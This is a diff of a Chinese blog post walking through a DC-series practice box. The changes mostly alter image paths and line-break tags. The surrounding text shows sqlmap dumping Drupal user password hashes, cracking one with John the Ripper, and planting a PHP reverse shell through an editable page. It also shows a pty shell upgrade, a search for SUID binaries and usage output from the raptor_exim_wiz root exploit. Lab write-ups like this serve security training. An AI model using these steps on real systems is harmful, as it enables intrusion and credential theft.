@@ -41,18 +41,18 @@
 <meta property="og:url" content="http://example.com/posts/437699f/index.html">
 <meta property="og:site_name" content="Mamor&#39;s Blog">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/posts/437699f/content.png">
-<meta property="og:image" content="http://example.com/posts/437699f/ncshell.png">
-<meta property="og:image" content="http://example.com/posts/437699f/submit.png">
-<meta property="og:image" content="http://example.com/posts/437699f/python_shell.png">
-<meta property="og:image" content="http://example.com/posts/437699f/find.png">
-<meta property="og:image" content="http://example.com/posts/437699f/flag.png">
+<meta property="og:image" content="http://example.com/.com//content.png">
+<meta property="og:image" content="http://example.com/.com//ncshell.png">
+<meta property="og:image" content="http://example.com/.com//submit.png">
+<meta property="og:image" content="http://example.com/.com//python_shell.png">
+<meta property="og:image" content="http://example.com/.com//find.png">
+<meta property="og:image" content="http://example.com/.com//flag.png">
 <meta property="article:published_time" content="2021-05-09T06:07:57.000Z">
 <meta property="article:modified_time" content="2021-05-09T09:59:29.098Z">
 <meta property="article:author" content="Mamor">
 <meta property="article:tag" content="DCchallenges">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/posts/437699f/content.png">
+<meta name="twitter:image" content="http://example.com/.com//content.png">
 
 <link rel="canonical" href="http://example.com/posts/437699f/">
 
@@ -329,31 +329,31 @@
 <blockquote>
 <p> Database: d7db<br>Table: users<br>[16 columns]<br>+——————+——————+<br>| Column           | Type             |<br>+——————+——————+<br>| language         | varchar(12)      |<br>| access           | int(11)          |<br>| created          | int(11)          |<br>| data             | longblob         |<br>| init             | varchar(254)     |<br>| login            | int(11)          |<br>| mail             | varchar(254)     |<br>| name             | varchar(60)      |<br>| pass             | varchar(128)     |<br>| picture          | int(11)          |<br>| signature        | varchar(255)     |<br>| signature_format | varchar(255)     |<br>| status           | tinyint(4)       |<br>| theme            | varchar(255)     |<br>| timezone         | varchar(32)      |<br>| uid              | int(10) unsigned |</p>
 </blockquote>
-<br/>
+<br>
 
 <p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch -D d7db -T users -C name,pass -dump</code></p>
 <blockquote>
 <p>Database: d7db<br>Table: users<br>[2 entries]<br>+——-+———————————————————+<br>| name  | pass                                                    |<br>+——-+———————————————————+<br>| admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |<br>| john  | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |<br>+——-+———————————————————+</p>
 </blockquote>
 <p>跑出来两条数据 ，但是密码是加密的，根据john用户名提示，使用<code>john</code>解密</p>
-<br/>
+<br>
 
 <p><code>admin</code> 使用john没跑出来</p>
 <p><code>john</code> 密码为<code>turtle</code></p>
 <p><code>http://192.168.18.141/user/</code>登录成功</p>
 <p>打开content看看</p>
-<p><img src="content.png"></p>
-<br/>
+<p><img src="/.com//content.png"></p>
+<br>
 
 <h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>contact us页面可以编辑</p>
 <p>修改成php格式</p>
-<p><img src="ncshell.png"></p>
-<p><img src="submit.png"></p>
+<p><img src="/.com//ncshell.png"></p>
+<p><img src="/.com//submit.png"></p>
 <p>反弹交互shell</p>
 <p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
-<p><img src="python_shell.png"></p>
+<p><img src="/.com//python_shell.png"></p>
 <h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code>  查看具有root权限的命令</p>
-<p><img src="find.png"></p>
+<p><img src="/.com//find.png"></p>
 <p>试着利用下exim4</p>
 <p>查看exim4版本</p>
 <p><code>exim4 --version</code></p>
@@ -377,10 +377,10 @@
 <p>看下提示用法</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># Usage (setuid method):</span><br><span class="line"></span><br><span class="line"># $ id</span><br><span class="line"># uid&#x3D;1000(raptor) gid&#x3D;1000(raptor) groups&#x3D;1000(raptor) [...]</span><br><span class="line"># $ .&#x2F;raptor_exim_wiz -m setuid</span><br><span class="line"># Preparing setuid shell helper...</span><br><span class="line"># Delivering setuid payload...</span><br><span class="line"># [...]</span><br><span class="line"># Waiting 5 seconds...</span><br><span class="line"># -rwsr-xr-x 1 root raptor 8744 Jun 16 13:03 &#x2F;tmp&#x2F;pwned</span><br><span class="line"># # id</span><br><span class="line"># uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">#</span><br><span class="line"># Usage (netcat method):</span><br><span class="line"># $ id</span><br><span class="line"># uid&#x3D;1000(raptor) gid&#x3D;1000(raptor) groups&#x3D;1000(raptor) [...]</span><br><span class="line"># $ .&#x2F;raptor_exim_wiz -m netcat</span><br><span class="line"># Delivering netcat payload...</span><br><span class="line"># Waiting 5 seconds...</span><br><span class="line"># localhost [127.0.0.1] 31337 (?) open</span><br><span class="line"># id</span><br><span class="line"># uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">#</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="flag.png"></p>
-<br/>
+<p><img src="/.com//flag.png"></p>
+<br>
 
-<br/>
+<br>
 
 <blockquote>
 <h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/261074.html">https://www.freebuf.com/articles/web/261074.html</a></p>
